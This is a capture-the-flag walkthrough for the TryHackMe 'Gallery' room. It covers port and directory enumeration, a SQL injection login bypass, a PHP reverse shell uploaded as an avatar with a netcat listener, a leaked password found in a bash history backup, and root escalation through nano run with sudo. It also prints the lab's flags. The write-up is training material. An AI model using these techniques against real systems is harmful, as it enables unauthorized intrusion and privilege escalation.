# Room: Gallery

## General Info
- **Room link:** [Gallery](https://tryhackme.com/room/gallery666)


## Description

Our gallery is not very well secured.

## Provided Files / Links
- [x] Target Machine IP (10.10.158.132)

## Enumeration / Recon

- Port Enumeration:
`nmap -sV 10.10.158.132 -p- -T5`

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

Note: 2 http ports are open (80 and 8080).

- Directory Enumeration

I enumerate on the port 80:

`gobuster dir -u http://10.10.158.132 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt`

```
/gallery              (Status: 301) [Size: 316] [--> http://10.10.158.132/gallery/]
/server-status        (Status: 403) [Size: 278]
```

I enumerate on the port 8080 (directories):

`gobuster dir -u http://10.10.158.132:8080 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --exclude-length 15916`

```
/home                 (Status: 200) [Size: 16950]
/archives             (Status: 301) [Size: 324] [--> http://10.10.158.132:8080/archives/]
/login                (Status: 200) [Size: 19571]
/user                 (Status: 301) [Size: 320] [--> http://10.10.158.132:8080/user/]
/uploads              (Status: 301) [Size: 323] [--> http://10.10.158.132:8080/uploads/]
/assets               (Status: 301) [Size: 322] [--> http://10.10.158.132:8080/assets/]
/report               (Status: 301) [Size: 322] [--> http://10.10.158.132:8080/report/]
/albums               (Status: 301) [Size: 322] [--> http://10.10.158.132:8080/albums/]
/plugins              (Status: 301) [Size: 323] [--> http://10.10.158.132:8080/plugins/]
/database             (Status: 301) [Size: 324] [--> http://10.10.158.132:8080/database/]
/classes              (Status: 301) [Size: 323] [--> http://10.10.158.132:8080/classes/]
/index                (Status: 200) [Size: 148035437]
/config               (Status: 200) [Size: 7545]
/dist                 (Status: 301) [Size: 320] [--> http://10.10.158.132:8080/dist/]
/inc                  (Status: 301) [Size: 319] [--> http://10.10.158.132:8080/inc/]
/build                (Status: 301) [Size: 321] [--> http://10.10.158.132:8080/build/]
/schedules            (Status: 301) [Size: 325] [--> http://10.10.158.132:8080/schedules/]
/create_account       (Status: 200) [Size: 15726]
/server-status        (Status: 403) [Size: 280]
```

I enumerate the files on port 8080 as well:

`gobuster dir -u http://10.10.158.132:8080 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-files.txt --exclude-length 15916`

```
/index.php            (Status: 200) [Size: 16950]
/login.php            (Status: 200) [Size: 8047]
/wp-login.php         (Status: 200) [Size: 15843]
/create_account.php   (Status: 200) [Size: 8]
/config.php           (Status: 200) [Size: 0]
/home.php             (Status: 500) [Size: 0]
/404.html             (Status: 200) [Size: 198]
/.htaccess            (Status: 403) [Size: 280]
/.                    (Status: 200) [Size: 16950]
/.html                (Status: 403) [Size: 280]
/secure_login.php     (Status: 200) [Size: 15843]
/.php                 (Status: 403) [Size: 280]
/user_login.php       (Status: 200) [Size: 15843]
/.htpasswd            (Status: 403) [Size: 280]
/.htm                 (Status: 403) [Size: 280]
/customer-login.php   (Status: 200) [Size: 15843]
/checklogin.php       (Status: 200) [Size: 15843]
/.htpasswds           (Status: 403) [Size: 280]
/bb-login.php         (Status: 200) [Size: 15843]
/member_login.php     (Status: 200) [Size: 15843]
/admin_login.php      (Status: 200) [Size: 15843]
/adminlogin.php       (Status: 200) [Size: 15843]
/s2dlogin.php         (Status: 200) [Size: 15843]
/processlogin.php     (Status: 200) [Size: 15843]
/.htgroup             (Status: 403) [Size: 280]
/clientlogin.php      (Status: 200) [Size: 15843]
/wp-forum.phps        (Status: 403) [Size: 280]
/autologin.php        (Status: 200) [Size: 15843]
/process_login.php    (Status: 200) [Size: 15843]
/client_login.php     (Status: 200) [Size: 15843]
/dologin.php          (Status: 200) [Size: 15843]
/login.php3           (Status: 200) [Size: 15843]
/.htaccess.bak        (Status: 403) [Size: 280]
/batch.login.php      (Status: 200) [Size: 15843]
/c_login.php          (Status: 200) [Size: 15843]
/check_login.php      (Status: 200) [Size: 15843]
/midlogin.php         (Status: 200) [Size: 15843]
/myacc_login.php      (Status: 200) [Size: 15843]
/sendlogin.php        (Status: 200) [Size: 15843]
/staff-login.php      (Status: 200) [Size: 15843]
/.htuser              (Status: 403) [Size: 280]
/account-login.php    (Status: 200) [Size: 15843]
/customer_login.php   (Status: 200) [Size: 15843]
/fix_login.php        (Status: 200) [Size: 15843]
/memberlogin.php      (Status: 200) [Size: 15843]
/takelogin.php        (Status: 200) [Size: 15843]
/.ht                  (Status: 403) [Size: 280]
/.htc                 (Status: 403) [Size: 280]
/account_login.php    (Status: 200) [Size: 15843]
/alogin.php           (Status: 200) [Size: 15843]
/cplogin.php          (Status: 200) [Size: 15843]
/fblogin.php          (Status: 200) [Size: 15843]
/links_login.php      (Status: 200) [Size: 15843]
/login.php5           (Status: 200) [Size: 15843]
/resend_login.php     (Status: 200) [Size: 15843]
/userlogin.php        (Status: 200) [Size: 15843]
```

Most of the directories/files don't lead to anything relevant.

The only relevant page here is /gallery which leads to a login page.

When trying random username/password pairs, I notice that the SQL query that is made is actually displayed in the /login.php request:

`{"status":"incorrect","last_qry":"SELECT * from users where username = 'adazd' and password = md5('azdazd') "}`

I then try for SQL injection with a basic payload `' OR 1 = 1 -- -` and I get in being the administrator of the CMS "Simple Image Gallery".

In user account page, I notice that I can upload an avatar picture. I will try to test for RCE.
I create a PHP reverse shell, upload it, and listen to the port that I chose (`nc -nlvp 1337`).
I then get access to the target machine and I am www-data.

### Target machine exploitation

I stabilize the shell with `python3 -c 'import pty; pty.spawn("/bin/bash")'`.

Then I downloaded and ran linpeas.sh in the /tmp directory.

In the "Searching passwords in history files" section, I find this line:

`/var/backups/mike_home_backup/.bash_history:sudo -lb3stpassw0rdbr0xx`

`b3stpassw0rdbr0xx` looks like a password. I test it on the user mike and I am able to log in.

I can now get the flag in the user.txt file: **THM{af05cd30bfed67849befd546ef}**.

I check mike's permissions wiht `sudo -l`: `(root) NOPASSWD: /bin/bash /opt/rootkit.sh`.

The rootkit.sh script is the following:

```
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

# Execute your choice
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac
```

If I select the option `read`, I will be able to exploit nano to get privilege escalation as root.

Before executing the script, I make some changes in my shell to stabilize further:

- CTRL + Z to go back to my attacker machine
- `stty raw -echo;fg`
- I now have a stabilized shell where I all the key presses are well interpreted

I try to run the command `sudo /bin/bash /opt/rootkit.sh` and select the option `read` but it get the error: Error `opening terminal: unknown`. It means that the terminal type isn't properly set when nano is launched with sudo from that script.

I then export `export TERM=xterm` and run the script (`sudo /bin/bash /opt/rootkit.sh` and select the option `read`).

Following https://gtfobins.github.io/gtfobins/nano/, I just have to press CTRL + R and CTRL + X and I can perform any command as root: cat /root/root.txt => **THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}**. 